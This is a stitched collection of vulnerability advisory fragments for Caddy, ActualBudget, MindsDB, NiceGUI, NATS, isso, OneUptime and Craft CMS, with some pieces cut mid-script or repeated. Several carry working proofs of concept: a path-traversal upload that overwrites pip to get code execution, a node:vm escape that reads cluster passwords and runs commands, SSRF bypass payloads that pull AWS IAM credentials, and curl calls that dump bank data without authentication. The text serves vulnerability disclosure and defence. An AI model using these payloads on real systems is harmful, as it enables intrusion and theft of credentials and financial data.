Master tip: commit `58968b3fd38cacbf4b5e07cc8c8be27696dce60f`.\n\n### PoC\nPrereqs:\n- bash, curl\n- A pre-built Caddy binary available at `/opt/caddy-2.10.2/caddy` (edit `CADDY_BIN` in the script if needed)\n\n<details>\n<summary>Script (Click to expand)</summary>\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nCADDY_BIN=\"/opt/caddy-2.10.2/caddy\"\nHOST=\"127.0.0.1\"\nPORT=\"8080\"\n\nTMPDIR=\"$(mktemp -d)\"\nCADDYFILE=\"${TMPDIR}/Caddyfile\"\nLOG=\"${TMPDIR}/caddy.log\"\n\ncleanup() {\n  if [ -n \"${CADDY_PID:-}\" ] && kill -0 \"${CADDY_PID}\" 2>/dev/null;

Any internet-exposed Caddy deployment that relies on `host` matchers with large host lists (>100) to select protected routes (e.g. applying `basicauth`, `forward_auth`, `respond` deny rules, or protecting `reverse_proxy` backends) can be bypassed by varying the case of the `Host` header, allowing unauthorized access to sensitive endpoints depending on upstream configuration.\n\nThe reproduction is minimal per the reporting guidance; a realistic \"full\" scenario is Caddy fronting a multi-tenant app and doing `forward_auth`/`basicauth`/`deny` for `/admin` only when host is in a big (>100) allowlist, but the default handler still `reverse_proxy`ing to the same app. Then sending `Host: H050.TEST` skips the guarded route in Caddy, yet the upstream still treats it as the same tenant host --> `/admin` is reachable without the intended guard.\n\n\n### AI Use Disclosure\nA custom AI agent pipeline was used to discover the vulnerability, after which was manually reproduced and validated each step. The entire report was ran through an LLM for editing.\n\n### Disclosure/crediting\n\nAsim Viladi Oglu Manizada",

An attacker can bypass path-based routing and any access controls attached to that route by changing the casing of the request path.\n\n### Details\nIn Caddy `v2.10.2`, `MatchPath` is explicitly designed to be case-insensitive and lowercases match patterns during provisioning:\n\n- `modules/caddyhttp/matchers.go`: rationale captured in the `MatchPath` comment.\n- `MatchPath.Provision` lowercases configured patterns via `strings.ToLower`.\n- `MatchPath.MatchWithError` lowercases the request path for the normal matching path: `reqPath := strings.ToLower(r.URL.Path)`.\n\nBut when a match pattern contains a percent sign (`%`), `MatchPath.MatchWithError` switches to \"escaped space\" matching and builds the comparison string from `r.URL.EscapedPath()`:\n\n- `reqPathForPattern := CleanPath(r.URL.EscapedPath(), mergeSlashes)`\n- If it doesn't match, it `continue`s (skipping the remaining matching logic for that pattern).\n\nBecause `r.URL.EscapedPath()` is not lowercased, case differences in the request path can cause the escaped-space match to fail even though `MatchPath` is meant to be case-insensitive. For example, with a pattern of `/admin%2Fpanel`:\n\n- Requesting `/admin%2Fpanel` matches and can be denied as intended.\n- Requesting `/ADMIN%2Fpanel` does not match and falls through to other routes/handlers.\n\n#### Suggested fix\n- In the `%`-pattern matching path, ensure the effective string passed to `path.Match` is lowercased (same as the normal branch).\n  - Simplest seems to lowercase the constructed string in `matchPatternWithEscapeSequence` right before `path.Match`.\n\nReproduced on:\n- Stable release: `v2.10.2` -- this is the release referenced in the reproduction below.\n- Dev build: `v2.11.0-beta.2`.\n- Master tip: commit `58968b3fd38cacbf4b5e07cc8c8be27696dce60f`.\n\n### PoC\nPrereqs:\n- bash, curl\n- A pre-built Caddy binary available at `/opt/caddy-2.10.2/caddy` (edit `CADDY_BIN` in the script if needed)\n\n\n<details>\n<summary>Script (Click to expand)</summary>\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nCADDY_BIN=\"/opt/caddy-2.10.2/caddy\"\nHOST=\"127.0.0.1\"\nPORT=\"8080\"\n\nTMPDIR=\"$(mktemp -d)\"\nCADDYFILE=\"${TMPDIR}/Caddyfile\"\nLOG=\"${TMPDIR}/caddy.log\"\n\ncleanup() {\n  if [ -n \"${CADDY_PID:-}\" ] && kill -0 \"${CADDY_PID}\" 2>/dev/null;

Deployments that use `path` matchers with `%xx` patterns to block or protect sensitive endpoints (including encoded-path variants such as encoded slashes) can be bypassed by changing the casing of the request path, allowing unauthorized access to sensitive endpoints behind Caddy depending on upstream configuration.\n\nThe reproduction is minimal per the reporting guidance. In a realistic \"full\" scenario, a deployment may block `%xx` variants like `path /admin%2Fpanel`, otherwise proxying. If the backend is case-insensitive/normalizing, `/ADMIN%2Fpanel` maps to the same handler; Caddy’s `%`-pattern match misses due to case, so the block is skipped and the request falls through.\n\n\n### AI Use Disclosure\nA custom AI agent pipeline was used to discover the vulnerability, after which was manually reproduced and validated each step. The entire report was ran through an LLM to make sure nothing obvious was missed.\n\n### Disclosure/crediting\n\nAsim Viladi Oglu Manizada",

          "html": "### Summary\n\nTwo swallowed errors in `ClientAuthentication.provision()` cause mTLS client certificate authentication to silently fail open when a CA certificate file is missing, unreadable, or malformed. The server starts without error but accepts any client certificate signed by any system-trusted CA, completely bypassing the intended private CA trust boundary.\n\n### Details\n\nIn `modules/caddytls/connpolicy.go`, the `provision()` method has two `return nil` statements that should be `return err`:\n\n**Bug #1 — line 787:**\n```go\nders, err := convertPEMFilesToDER(fpath)\nif err != nil {\n    return nil  // BUG: should be \"return err\"\n}\n```\n\n**Bug #2 — line 800:**\n```go\nerr := caPool.Provision(ctx)\nif err != nil {\n    return nil  // BUG: should be \"return err\"\n}\n```\n\nCompare with line 811 which correctly returns the error:\n```go\ncaRaw, err := ctx.LoadModule(clientauth, \"CARaw\")\nif err != nil {\n    return err  // CORRECT\n}\n```\n\nWhen the error is swallowed on line 787, the chain is:\n\n1. `TrustedCACerts` remains empty (no DER data appended from the file)\n2. The `len(clientauth.TrustedCACerts) > 0` guard on line 794 is false — skipped\n3. `clientauth.CARaw` is nil — line 806 returns nil\n4. `clientauth.ca` remains nil — no CA pool was created\n5. `provision()` returns nil — caller thinks provisioning succeeded\n\nThen in `ConfigureTLSConfig()`:\n\n6. `Active()` returns true because `TrustedCACertPEMFiles` is non-empty\n7. Default mode is set to `RequireAndVerifyClientCert` (line 860)\n8. But `clientauth.ca` is nil, so `cfg.ClientCAs` is never set (line 867 skipped)\n9. Go's `crypto/tls` with `RequireAndVerifyClientCert` + nil `ClientCAs` verifies client certs against the **system root pool** instead of the intended CA\n\nThe fix is changing `return nil` to `return err` on lines 787 and 800.\n\n### PoC\n\n1. Configure Caddy with mTLS pointing to a nonexistent CA file:\n\n```\n{\n    \"apps\": {\n        \"http\": {\n            \"servers\": {\n                \"srv0\": {\n                    \"listen\": [\":443\"],\n                    \"tls_connection_policies\": [{\n                        \"client_authentication\": {\n                            \"trusted_ca_certs_pem_files\": [\"/nonexistent/ca.pem\"]\n                        }\n                    }]\n                }\n            }\n        }\n    }\n}\n```\n\n2. Start Caddy — it starts without any error or warning.\n\n3. Connect with any client certificate (even self-signed):\n```bash\nopenssl s_client -connect localhost:443 -cert client.pem -key client-key.pem\n```\n\n4. The TLS handshake succeeds despite the certificate not being signed by the intended CA.\n\nA full Go test that proves the bug end-to-end (including a successful TLS handshake with a random self-signed client cert) is here: https://gist.github.com/moscowchill/9566c79c76c0b64c57f8bd0716f97c48\n\nTest output:\n```\n=== RUN   TestSwallowedErrorMTLSFailOpen\n    BUG CONFIRMED: provision() swallowed the error from a nonexistent CA file.\n    tls.Config has RequireAndVerifyClientCert but ClientCAs is nil.\n    CRITICAL: TLS handshake succeeded with a self-signed client cert!\n    The server accepted a client certificate NOT signed by the intended CA.\n--- PASS: TestSwallowedErrorMTLSFailOpen (0.03s)\n```\n\n### Impact\n\nAny deployment using `trusted_ca_cert_file` or `trusted_ca_certs_pem_files` for mTLS will silently degrade to accepting any system-trusted client certificate if the CA file becomes unavailable. This can happen due to a typo in the path, file rotation, corruption, or permission changes. The server gives no indication that mTLS is misconfigured.",

It accepts a list of patterns and checks if any files exist in the root that match the provided patterns. It's commonly used in Caddy configs. For example, it's used in SPA applications to rewrite every route that doesn't exist as a file to `index.html`. \n \n```caddy\nexample.com {\n\troot * /srv\n\tencode\n\ttry_files {path} /index.html\n\tfile_server\n}\n```\n\n`try_files` patterns are actually glob patterns and file matcher expands them. The `{path}` in the pattern is replaced with\nthe request path and then [is expanded by `fs.Glob`](https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L398). The request path is sanitized before being placed inside the pattern and the special chars are escaped . [The following code](https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L361) is the sanitization part.   \n\n```go\nvar globSafeRepl = strings.NewReplacer(\n\t\"*\", \"\\\\*\",\n\t\"[\", \"\\\\[\",\n\t\"?\", \"\\\\?\",\n)\n\nexpandedFile, err := repl.ReplaceFunc(file, func(variable string, val any) (any, error) {\n    if runtime.GOOS == \"windows\" {\n        return val, nil\n    }\n    switch v := val.(type) {\n    case string:\n        return globSafeRepl.Replace(v), nil\n    case fmt.Stringer:\n        return globSafeRepl.Replace(v.String()), nil\n    }\n    return val, nil\n})\n```\n\nThe problem here is that it does not escape backslashes. `/something-\\*/` can match a file named `something-\\-anything.txt`, but it should not. The primitive that this vulnerability provides is not very useful, as it only allows an attacker to guess filenames that contain a backslash and they should also know the characters before that backslash.\n\nThe backslash is mainly used to escape special characters in glob patterns, but when it appears before non special characters, it is ignored. This means that `h\\ello*` matches `hello world` even though `e` is not a special character. This behavior can be abused to bypass path protections that might be in place. For example, if there is a reverse proxy that only allows `/documents/*` to the internal network and its upstream is a Caddy server that uses `try_files`, the reverse proxy's protection can be bypassed by requesting the path `/do%5ccuments/`.\n\nSome configurations that implement blacklisting and serving together in Caddy are also vulnerable but there's a condition that the `try_files` directive and the filtering `route`/`handle` must not be in a same block because `try_files` directive [executes before `route` and `handle` directives](https://caddyserver.com/docs/caddyfile/directives#directive-order). \n\nFor example the following config isn't vulnerable.\n\n```caddy\n:80 {\n    root * /srv\n\n    route /documents/* {\n        respond \"Access denied\" 403\n    }\n\n    try_files {path} /index.html\n    file_server\n}\n```\n\nBut this one is vulnerable.\n\n```caddy\n:80 {\n    root * /srv\n\n    route /documents/* {\n        respond \"Access denied\" 403\n    }\n\n    route /* {\n        try_files {path} /index.html\n    }\n    file_server\n}\n```\n\nThis config is also vulnerable because `Header` directives executes before `try_files`. \n\n```caddy\n:80 {\n    root * /srv \n    header /uploads/* {\n        X-Content-Type-Options \"nosniff\"\n        Content-Security-Policy \"default-src 'none';\"\n    }\n    try_files {path} /index.html\n    file_server\n}\n```\n\n### PoC\n\nPaste this script somewhere and run it. It should print \"some content\" which means that the nginx protection has failed.\n\n```bash\n#!/bin/bash\n\nmkdir secret\necho 'some content' > secret/secret.txt\n\ncat > Caddyfile <<'EOF'\n:80 {\n    root * /srv\n\n    try_files {path} /index.html\n    file_server\n}\nEOF\n\ncat > nginx.conf <<'EOF'\nevents {}\n\nhttp {\n    server {\n        listen 80;\n        \n        location /secret {\n            return 403;\n        }\n\n        location / {\n            proxy_pass http://caddy;\n            proxy_set_header Host $host;\n        }\n    }\n}\nEOF\n\ncat > docker-compose.yml <<'EOF'\nservices:\n  caddy:\n    # caddy@sha256:c3d7ee5d2b11f9dc54f947f68a734c84e9c9666c92c88a7f30b9cba5da182adb\n    image: caddy:latest\n    volumes:\n      - ./Caddyfile:/etc/caddy/Caddyfile:ro\n      - ./secret:/srv/secret:ro\n  nginx:\n    # nginx@sha256:341bf0f3ce6c5277d6002cf6e1fb0319fa4252add24ab6a0e262e0056d313208\n    image: nginx:latest\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro\n    ports:\n      - \"8000:80\" \nEOF\n\ndocker compose up -d\ncurl 'localhost:8000/secre%5ct/secret.txt'\n```\n\n### Impact\n\nThis vulnerability may allow an attacker to bypass security protections.

This vulnerability impacts all ActualBudget Server users with the SimpleFIN or Pluggy.ai integrations configured. The ActualBudget Server instance must be reachable over the network.\n\n### Details\n\nThe ActualBudget server component allows for integration with SimpleFIN and Pluggy.ai services. These services read bank account balances and transaction data from users' banks and return the data to ActualBudget. The affected endpoints facilitate this integration and are intended to be used only by logged in users for the purposes of syncing bank transaction data.\n\nThe vulnerable source code is in the following files in the `actualbudget/actual` GitHub repository (https://github.com/actualbudget/actual/):\n* `/packages/sync-server/src/app-simplefin/app-simplefin.js`\n* `/packages/sync-server/src/app-pluggyai/app-pluggyai.js`\n\nThe sensitive endpoints missing authentication are:\n* `POST /simplefin/status`\n* `POST /simplefin/accounts`\n* `POST /simplefin/transactions`\n* `POST /pluggyai/status`\n* `POST /pluggyai/accounts`\n* `POST /pluggyai/transactions`\n\nThe following source code is an example of an integration that implements the authentication middleware (`packages/sync-server/src/app-gocardless/app-gocardless.js`):\n```js\nconst app = express();\napp.use(requestLoggerMiddleware);\n...\napp.use(express.json());\napp.use(validateSessionMiddleware); // <-- Uses authentication\n```\n\n\n### PoC\n\nThe below commands exploit this vulnerability on both the SimpleFIN and Pluggy.ai endpoints. No authentication is required. Network access is required.\n\nSimpleFIN:\n```bash\n# Check if SimpleFIN is configured\ncurl -X POST \"https://<actualbudgethost>/simplefin/status\"\n\n# List SimpleFIN accounts\ncurl -X POST \"https://<actualbudgethost>/simplefin/accounts\"\n\n# List SimpleFIN transactions with an account ID from the previous request\ncurl -X POST \"https://<actualbudgethost>/simplefin/transactions\" -H \"Content-Type: application/json\" -d '{\"accountId\":[\"ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\"],\"startDate\":[\"2026-02-01\"]}'\n```\n\nPluggyAI:\n```bash\n# Check if PluggyAI is configured\ncurl -X POST \"https://<actualbudgethost>/pluggyai/status\"\n\n# List Pluggy.ai accounts\ncurl -X POST \"https://<actualbudgethost>/pluggyai/accounts\"\n\n# List Pluggy.ai transactions with an account ID from the previous request\ncurl -X POST \"https://<actualbudgethost>/pluggyai/transactions\" -H \"Content-Type: application/json\" -d '{\"accountId\":[\"ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\"],\"startDate\":[\"2026-02-01\"]}'\n```\n\nExample response from `POST /simplefin/accounts`:\n```json\n{\n    \"status\": \"ok\",\n    \"data\": {\n        \"accounts\": [\n            {\n                \"id\": \"ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\",\n                \"name\": \"CHEQUING ACCOUNT\",\n                \"currency\": \"CAD\",\n                \"balance\": \"1234.56\",\n                \"available-balance\": \"0.00\",\n                \"balance-date\": 1771531758,\n                \"transactions\": [],\n                \"holdings\": [],\n                \"org\": {\n                    \"domain\": \"www.cibc.com\",\n                    \"name\": \"CIBC\",\n                    \"sfin-url\": \"https://beta-bridge.simplefin.org/simplefin\",\n                    \"url\": \"https://www.cibconline.cibc.com\",\n                    \"id\": \"www.cibconline.cibc.com\"\n                }\n            },\n            ...\n        ]\n    }\n}\n```\n\nExample response from `POST /simplefin/transactions`:\n```json\n{\n    \"status\": \"ok\",\n    \"data\": {\n        \"ACT-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\": {\n            \"balances\": [\n                {\n                    \"balanceAmount\": {\n                        \"amount\": \"1234.56\",\n                        \"currency\": \"CAD\"\n                    },\n                    \"balanceType\": \"expected\",\n                    \"referenceDate\": \"2026-02-19\"\n                },\n                {\n                    \"balanceAmount\": {\n                        \"amount\": \"1234.56\",\n                        \"currency\": \"CAD\"\n                    },\n                    \"balanceType\": \"interimAvailable\",\n                    \"referenceDate\": \"2026-02-19\"\n                }\n            ],\n            \"startingBalance\": 123456,\n            \"transactions\": {\n                \"all\": [\n                    {\n                        \"booked\": true,\n                        \"sortOrder\": 1771502400,\n                        \"date\": \"2026-02-19\",\n                        \"payeeName\": \"E-Transfer\",\n                        \"notes\": \"SEND E-TFR ***ABC\",\n                        \"transactionAmount\": {\n                            \"amount\": \"-12.00\",\n                            \"currency\": \"USD\"\n                        },\n                        \"transactionId\": \"TRN-XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\",\n                        \"transactedDate\": \"2026-02-19\",\n                        \"postedDate\": \"2026-02-19\"\n                    },\n                    ...\n                ],\n                \"pending\": []\n            }\n        }\n    }\n}\n```",

Users should upgrade to v3.75.0 or later.\n\n### Workarounds\n\nIf users cannot upgrade immediately, they can mitigate this vulnerability by disabling external file uploads via the `disableExternalFile` upload collection option, or by restricting `create` access on upload-enabled collections to **trusted users only**.",

The file write operation occurs before calling clear_filename and save_file, meaning there is no filtering of filenames or file types, allowing arbitrary content to be written to any path on the server.\n\n\n### PoC\n\nThis vulnerability can be exploited to overwrite existing executable files, which retain their executable permissions after being overwritten. In addition to conventional file upload exploitation methods, we provide a way to achieve Remote Code Execution (RCE) by leveraging MindsDB's own functionality.\n\nThe API endpoint /<handler_name>/install is used to install handlers, which internally calls install_dependencies to install dependencies via pip. This function executes pip using subprocess.Popen. Therefore, an attacker can:\n\n1. Exploit the vulnerability to overwrite /venv/lib/python3.10/site-packages/pip/__init__.py with a malicious Python script.\n2. Trigger the execution of the malicious script by calling /<handler_name>/install, which invokes pip.\n \nExploit：\n```\nPUT /api/files/mm HTTP/1.1\nHost: ip:47334\nContent-Length: 579\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: application/json, text/plain, */*\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryv9dZC0cAHLlHSHD9\nOrigin: http://ip:47334\nReferer: http://ip:47334/fileUpload\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh,en;q=0.9,zh-CN;q=0.8\nCookie: bid=87948125-5042-4fc8-a692-9cbf71e387be\nConnection: keep-alive\n\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9\nContent-Disposition: form-data; name=\"name\"\n\nmm\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9\nContent-Disposition: form-data; name=\"source\"\n\nmm\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9\nContent-Disposition: form-data; name=\"source_type\"\n\nfile\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../venv/lib/python3.10/site-packages/pip/__init__.py\"\nContent-Type: text/plain\n\nimport os\nos.system(\"touch /tmp/rce_by_hacker\")\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9--\n```\nAfter sending this request, you can observe the logs in Docker's output:\n```\n2025-05-30 02:26:52,432            http INFO     python_multipart.multipart: Opening a file on disk\n2025-05-30 02:26:52,433            http INFO     python_multipart.multipart: Saving with filename in: b'/root/mdb_storage/tmp/mindsdb_byom_file_89h0zcz0'\n2025-05-30 02:26:52,433            http INFO     python_multipart.multipart: Opening file: b'/root/mdb_storage/tmp/mindsdb_byom_file_89h0zcz0/../../../../../../venv/lib/python3.10/site-packages/pip/__init__.py'\n```\nAt this point, you can see that the file has been successfully overwritten:\n```\nroot@e445c93b2fd5:/mindsdb# cat /venv/lib/python3.10/site-packages/pip/__init__.py\nimport os\nos.system(\"touch /tmp/rce_by_hacker\")\n```\nAfterwards, install any handler in the UI, and you will see that the file rce_by_hacker is successfully created in the /tmp directory.

When user-controlled input is passed as the method name, an attacker can inject arbitrary JavaScript that executes in the victim's browser.\n\nAdditionally, `Element.run_method()` and `Element.get_computed_prop()` used string interpolation instead of `json.dumps()` for the method/property name, allowing quote injection to break out of the intended string context.\n\n### Attack Vector\n\nAn attacker crafts a malicious URL with a payload as a query parameter. If the application passes this parameter as a method name to any of the affected APIs, the payload is sent to the client via WebSocket and executed via `eval()`.\n\n**Example:** `/?method=alert(document.cookie)` combined with application code like:\n```python\nelement.run_method(user_provided_method_name)\n```\n\n### Impact\n\n- Cookie/token theft\n- DOM manipulation (phishing, fake login forms)\n- Actions performed as the victim user\n\n### Affected Methods\n\n1. `Element.run_method()`\n2. `Element.get_computed_prop()`\n3. `AgGrid.run_grid_method()`\n4. `AgGrid.run_row_method()`\n5. `EChart.run_chart_method()`\n6. `JsonEditor.run_editor_method()`\n7. `Xterm.run_terminal_method()`\n8. `Leaflet.run_map_method()`\n9. `Leaflet.run_layer_method()`\n10. `LeafletLayer.run_method()`\n\n### Fix\n\n1. Use `json.dumps()` for proper escaping of method/property names in `run_method()` and `get_computed_prop()`\n2. Remove the `eval()` fallback from `runMethod()` in `nicegui.js` — method names that are not found on the element now raise an error instead of being evaluated as arbitrary JavaScript\n\n### Migration\n\nCode that previously passed JavaScript functions as method names needs to use `ui.run_javascript()` instead:\n\n```python\n# Before:\nrow = await grid.run_grid_method('g => g.getDisplayedRowAtIndex(0).data')\n\n# After:\nrow = await ui.run_javascript(f'return getElement({grid.id}).api.getDisplayedRowAtIndex(0).data')\n```",

The implementation bound the memory size of a NATS message but did not independently bound the memory consumption of the memory stream when constructing a NATS message which might then fail validation for size reasons.\n\nAn attacker can use a compression bomb to cause excessive memory consumption, often resulting in the operating system terminating the server process.\n\nThe use of compression is negotiated before authentication, so this does not require valid NATS credentials to exploit.\n\nThe fix was to bounds the decompression to fail once the message was too large, instead of continuing on.\n\n### Patches\n\nThis was released in nats-server without being highlighted as a security issue.  It should have been, this was an oversight.  Per the NATS security policy, because this does not require a valid user, it is CVE-worthy.\n\nThis was fixed in the v2.11 series with v2.11.12 and in the v2.12 series with v2.12.3.\n\n### Workarounds\n\nThis only affects deployments which use WebSockets and which expose the network port to untrusted end-points.\n\n### References\n\nThis was reported to the NATS maintainers by Pavel Kohout of Aisle Research (www.aisle.com).",

The website field was HTML-escaped using quote=False, which left single and double quotes unescaped. Since the frontend inserts the website value directly into a single-quoted href attribute via string concatenation, a single quote in the URL breaks out of the attribute context, allowing injection of arbitrary event handlers (e.g. onmouseover, onclick).\n\nThe same escaping was missing entirely from the user-facing comment edit endpoint (PUT /id/<id>) and the moderation edit endpoint (POST /id/<id>/edit/<key>).\n\nAny visitor to a page embedding isso comments is impacted. No authentication or interaction beyond mouse movement is required to trigger a payload — an attacker can post a comment anonymously (moderation is off by default) with a crafted website URL, and the payload persists in the database and fires on every page load. With the full-page invisible overlay technique described in the report, the victim only needs to move their mouse.\n\n## Patches\n\nThe issue is fixed in commit 3cf27c2. Users should upgrade to a version containing that commit once released. The fix applies html.escape(..., quote=True) to the website field across all three write paths (POST /new, PUT /id/<id>, POST /id/<id>/edit/<key>), and adds input validation and escaping to the moderation edit endpoint which previously had neither.\n\n## Workarounds\n\n  Enabling comment moderation (moderation = enabled = true in isso.cfg) prevents unauthenticated users from publishing comments, raising the bar for exploitation. However, it\n  does not fully mitigate the issue since a moderator activating a malicious comment would still expose visitors. There is no configuration-only workaround that fully prevents\n   the vulnerability.\n\n## Resources\n\n  - https://docs.python.org/3/library/html.html#html.escape — note the quote parameter",

          "html": "### Summary\n\nOneUptime lets project members write custom JavaScript that runs inside monitors. The problem is it executes that code using Node.js's built-in `vm` module, which Node.js itself documents as \"not a security mechanism — do not use it to run untrusted code.\" The classic one-liner escape gives full access to the underlying process, and since the probe runs with host networking and holds all cluster credentials in its environment, this turns into a full cluster compromise for anyone who can register an account.\n\n### Details\n\nThe vulnerable code is in `Common/Server/Utils/VM/VMRunner.ts` at line 55:\n\n```typescript\nvm.runInContext(script, sandbox, { timeout })\n```\n\nThe JavaScript that reaches this call comes straight from the monitor's `customCode` field, which is only validated as `Zod.string().optional()` in `Common/Types/Monitor/MonitorStep.ts:531`. No AST analysis, no keyword filtering, nothing — just a string that goes directly into `vm.runInContext()`.\n\nBoth `CustomCodeMonitor.ts` and `SyntheticMonitor.ts` import `VMRunner` directly inside the probe process. So when the probe picks up a monitor and runs it, the escape executes in the probe's own process — not a child process, not a container.\n\nTwo things make this especially bad:\n\nFirst, the probe runs with `network_mode: host` (see `docker-compose.base.yml:397`) and carries `ONEUPTIME_SECRET`, `DATABASE_PASSWORD`, `REDIS_PASSWORD`, and `CLICKHOUSE_PASSWORD` as environment variables. Once you escape the sandbox you have all of those.\n\nSecond, the permission to create monitors is granted to `Permission.ProjectMember` — the lowest role — in `Common/Models/DatabaseModels/Monitor.ts:46-51`. There is no check that restricts Custom JavaScript Code monitors to admins only. And since open registration is on by default (`disableSignup: false`), any random person on the internet can reach this in about 30 seconds.\n\nOne more thing worth flagging: the `IsolatedVM` microservice is also affected despite its name. `IsolatedVM/API/VM.ts:41` calls the exact same `VMRunner.runCodeInSandbox()` — it does NOT use the `isolated-vm` npm package. Workflow components and monitor criteria expressions both route through it and are equally exploitable.\n\n### PoC\n\n1. Register at `/accounts/register` — signup is open by default, no invite needed\n2. Create a project — you get ProjectMember automatically\n3. Go to Monitors → Add Monitor → pick **Custom JavaScript Code**\n4. Paste this into the code field:\n\n```javascript\nconst proc = this.constructor.constructor('return process')();\nconst run = proc.mainModule.require('child_process').execSync;\nreturn {\n  data: {\n    secret:     proc.env.ONEUPTIME_SECRET,\n    db_pass:    proc.env.DATABASE_PASSWORD,\n    redis_pass: proc.env.REDIS_PASSWORD,\n    id:         run('id').toString().trim(),\n    hostname:   run('hostname').toString().trim()\n  }\n};\n```\n\n5. Save the monitor and wait about 60 seconds for the probe to poll\n6. Open Monitor Logs — the result contains the cluster secret, database password, and the output of `id` running on the probe host\n\nThat's it. No admin account, no special config, no extra steps.\n\n### Impact\n\nThis is a code injection vulnerability affecting any OneUptime deployment with open registration or any trusted user with ProjectMember access. The attacker gets arbitrary command execution on the probe host, all cluster credentials from the environment, and with host networking can directly connect to PostgreSQL, Redis, and ClickHouse using those credentials. One monitor creation → full cluster compromise.\n\nThe straightforward fix is to replace `node:vm` with the `isolated-vm` npm package, which provides real V8 isolate sandboxing and is the standard solution for this exact problem in the Node.js ecosystem.",

Get the IPv4 address corresponding to a given Internet host name\"*\n\nWhen no IPv4 (A record) exists, `gethostbyname()` returns the hostname string unchanged.\n\n### Bypass Mechanism\n\n```\n+-----------------------------------------------------------------------------+\n| Step 1: Attacker provides URL                                               |\n|         http://fd00-ec2--254.sslip.io/latest/meta-data/                     |\n+-----------------------------------------------------------------------------+\n| Step 2: Validation calls gethostbyname('fd00-ec2--254.sslip.io')            |\n|         -> No A record exists                                               |\n|         -> Returns: \"fd00-ec2--254.sslip.io\" (string, not an IP!)           |\n+-----------------------------------------------------------------------------+\n| Step 3: Blocklist check                                                     |\n|         in_array(\"fd00-ec2--254.sslip.io\", ['169.254.169.254', ...])       |\n|         -> FALSE (string != IPv4 addresses)                                 |\n|         -> VALIDATION PASSES                                                |\n+-----------------------------------------------------------------------------+\n| Step 4: Guzzle makes HTTP request                                           |\n|         -> Resolves DNS (including AAAA records)                            |\n|         -> Gets IPv6: fd00:ec2::254                                         |\n|         -> Connects to AWS IMDS IPv6 endpoint                               |\n|         -> CREDENTIALS STOLEN                                               |\n+-----------------------------------------------------------------------------+\n```\n\n---\n\n## Bypass Payloads\n\n### Blocked IPv4 Addresses and Their IPv6 Bypass Equivalents\n\n| Cloud Provider | Blocked IPv4 | IPv6 Equivalent | Bypass Payload |\n|----------------|--------------|-----------------|----------------|\n| **AWS EC2 IMDS** | `169.254.169.254` | `fd00:ec2::254` | `http://fd00-ec2--254.sslip.io/` |\n| **AWS ECS** | `169.254.170.2` | `fd00:ec2::254` (via IMDS) | `http://fd00-ec2--254.sslip.io/` |\n| **Google Cloud GCP** | `169.254.169.254` | `fd20:ce::254` | `http://fd20-ce--254.sslip.io/` |\n| **Azure** | `169.254.169.254` | No IPv6 endpoint | N/A |\n| **Alibaba Cloud** | `100.100.100.200` | No documented IPv6 | N/A |\n| **Oracle Cloud** | `192.0.0.192` | No documented IPv6 | N/A |\n\n### Additional IPv6 Internal Service Bypass Payloads\n\n| Target | IPv6 Address | Bypass Payload |\n|--------|--------------|----------------|\n| **IPv6 Loopback** | `::1` | `http://0-0-0-0-0-0-0-1.sslip.io/` |\n| **AWS NTP Service** | `fd00:ec2::123` | `http://fd00-ec2--123.sslip.io/` |\n| **AWS DNS Service** | `fd00:ec2::253` | `http://fd00-ec2--253.sslip.io/` |\n| **IPv4-mapped IPv6** | `::ffff:169.254.169.254` | `http://0-0-0-0-0-0-ffff-a9fe-a9fe.sslip.io/` |\n\n---\n\n## Steps to Reproduce\n\n### Step 1: Verify DNS Resolution\n\n```bash\n# Verify the hostname has no IPv4 record (what gethostbyname sees)\n$ dig fd00-ec2--254.sslip.io A +short\n# (empty - no IPv4 record)\n\n# Verify the hostname has IPv6 record (what Guzzle/curl uses)\n$ dig fd00-ec2--254.sslip.io AAAA +short\nfd00:ec2::254\n```\n\n### Step 2: Enumerate AWS IAM Role Name\n\n```bash\ncurl -sk \"https://TARGET/index.php?p=admin/actions/graphql/api\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer YOUR_GRAPHQL_TOKEN\" \\\n  -d '{\n    \"query\": \"mutation { save_photos_Asset(_file: { url: \\\"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/\\\", filename: \\\"role.txt\\\" }) { id } }\"\n  }'\n```\n\n### Step 3: Retrieve AWS Credentials\n\n```bash\n# Replace ROLE_NAME with the role discovered in Step 2\ncurl -sk \"https://TARGET/index.php?p=admin/actions/graphql/api\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer YOUR_GRAPHQL_TOKEN\" \\\n  -d '{\n    \"query\": \"mutation { save_photos_Asset(_file: { url: \\\"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/ROLE_NAME\\\", filename: \\\"creds.json\\\" }) { id } }\"\n  }'\n```\n\n### Step 4: Access Saved Credentials\n\nThe credentials will be saved to the asset volume (e.g., `/userphotos/photos/creds.json`).\n\n---\n\n### Attack Scenario\n\n1. Attacker finds Craft CMS instance with GraphQL asset mutations enabled\n2. Attacker sends mutation with `url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/\"`\n3. Error message or saved file reveals IAM role name\n4. Attacker retrieves credentials via second mutation\n5. Attacker uses credentials to access AWS services\n6. 